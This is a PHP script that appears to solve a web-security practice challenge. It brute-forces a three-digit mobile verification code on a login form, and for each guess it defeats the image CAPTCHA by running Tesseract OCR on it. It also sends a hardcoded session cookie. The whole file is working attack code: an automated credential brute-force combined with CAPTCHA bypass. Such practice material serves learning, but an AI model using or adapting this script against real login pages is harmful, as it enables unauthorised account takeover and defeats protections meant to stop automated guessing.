<?php
/**
 * Created by 独自等待
 * Date: 2014/11/20
 * Time: 9:27
 * Name: ocr.php
 * 独自等待博客：http://www.waitalone.cn/
 */
error_reporting(7);
if (!extension_loaded('curl')) exit('请开启CURL扩展,谢谢!');
crack_key();

function crack_key()
{
    $crack_url = 'http://1.hacklist.sinaapp.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php';
    for ($i = 100; $i <= 999; $i++) {
        $vcode = mkvcode();
        $post_data = array(
            'username' => 13388886666,
            'mobi_code' => $i,
            'user_code' => $vcode,
            'Login' => 'submit'
        );
        $response = send_pack('POST', $crack_url, $post_data);
        if (!strpos($response, 'error')) {
            system('cls');
            echo $response;
            break;
        }else{
            echo $response."\n";
        }
    }
}


function mkvcode()
{
    $vcode = '';
    $vcode_url = "http://1.hacklist.sinaapp.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php";
    $pic = send_pack('GET', $vcode_url);
    file_put_contents('vcode.png', $pic);
    $cmd = "\"D:\\Program Files (x86)\\Tesseract-OCR\\tesseract.exe\" vcode.png vcode";
    system($cmd);
    if (file_exists('vcode.txt')) {
        $vcode = file_get_contents('vcode.txt');
        $vcode = trim($vcode);
        $vcode = str_replace(' ', '', $vcode);
    }
    if (strlen($vcode) == 4) {
        return $vcode;
    } else {
        return mkvcode();
    }
}

//数据包发送函数
function send_pack($method, $url, $post_data = array())
{
    $cookie = 'saeut=218.108.135.246.1416190347811282;PHPSESSID=6eac12ef61de5649b9bfd8712b0f09c2';
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_COOKIE, $cookie);
    if ($method == 'POST') {
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);
    }
    $data = curl_exec($curl);
    curl_close($curl);
    return $data;
}
